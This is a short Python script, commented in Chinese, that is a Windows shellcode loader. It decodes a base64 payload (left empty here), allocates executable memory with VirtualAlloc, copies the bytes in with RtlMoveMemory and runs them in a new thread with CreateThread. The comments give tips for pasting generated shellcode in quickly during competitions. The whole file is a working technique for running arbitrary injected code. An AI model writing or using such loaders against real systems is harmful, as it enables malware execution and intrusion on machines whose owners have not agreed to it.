import base64
import ctypes
# d 这里是 shellcode 的base64，
# 如果是在比赛中为了快捷，可以直接把生成的 shellcode 加上 b"" 
# 直接赋值给 e 变量 就行，注意这个是 加载的第二种方式，是赋值到 e 变量。只要保证e是一个字节型就行，
# 如 buf=b“\xdd\xff\xff.........”
d=''
e = base64.b64decode(d)
shellcode=bytearray(e)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf=(ctypes.c_char*len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
handle=ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))